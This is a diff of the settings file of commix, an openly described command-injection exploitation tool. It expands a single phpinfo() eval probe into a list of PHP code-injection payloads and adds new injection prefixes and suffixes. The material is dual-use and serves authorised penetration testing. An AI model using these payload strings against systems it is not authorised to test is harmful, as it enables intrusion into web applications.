@@ -216,7 +216,7 @@ DESCRIPTION_FULL = "Automated All-in-One OS Command Injection Exploitation Tool"
 DESCRIPTION = "The command injection exploiter"
 AUTHOR  = "Anastasios Stasinopoulos"
 VERSION_NUM = "3.3"
-REVISION = "13"
+REVISION = "14"
 STABLE_RELEASE = False
 if STABLE_RELEASE:
   VERSION = "v" + VERSION_NUM + "-stable"
@@ -256,7 +256,13 @@ INJECT_TAG_REGEX = r"(?i)INJECT[_]?HERE"
 VALUE_BOUNDARIES = r'[\\/](.+?)[\\/]'
 
 #Basic heuristic checks for code injection warnings or... phpinfo page ;)
-BASIC_TEST = "\\\\/{${eval(phpinfo())}}\\/\\"
+PHPINFO_PAYLOAD = "eval(phpinfo())"
+PHPINFO_CHECK_PAYLOADS = ["print(" + PHPINFO_PAYLOAD + ")", 
+                          "test)'}" + PHPINFO_PAYLOAD + "'#",
+                          "'." + PHPINFO_PAYLOAD + ".'",
+                          "{${" + PHPINFO_PAYLOAD + "}}",
+                          "\\\\/{${" + PHPINFO_PAYLOAD + "}}\\/\\"
+                         ]
 
 # Executed phpinfo()
 IDENTIFIED_PHPINFO = False
@@ -361,13 +367,13 @@ JUNK_COMBINATION = ["&&&", "|||", "|&&", "&|", "&;", "|;", "%7C;", "%26;", "%7C&
 EXECUTION_FUNCTIONS = ["exec", "system", "shell_exec", "passthru", "proc_open", "popen"]
 
 # The code injection prefixes.
-EVAL_PREFIXES = ["{${", "\".", "'.", "", ";", "'", ")", "')", "\")", ");}", "');}", "\");}"]
+EVAL_PREFIXES = [".", "", "{${", "\".", "'.", "", ";", "'", ")", "')", "\")", ");}", "');}", "\");}"]
 
 # The code injection separators.
 EVAL_SEPARATORS = ["", "%0a", "\\n", "%0d%0a", "\\r\\n"]
 
 # The code injection suffixes.
-EVAL_SUFFIXES = ["}}", ".\"", ".'", "", "\\\\", "//", "#", ")}"]
+EVAL_SUFFIXES = ["", "}}", ".\"", ".'", "", "\\\\", "//", "#", ")}"]
 
 # The default (url-ecoded) white-space.
 WHITESPACES = ["%20"]
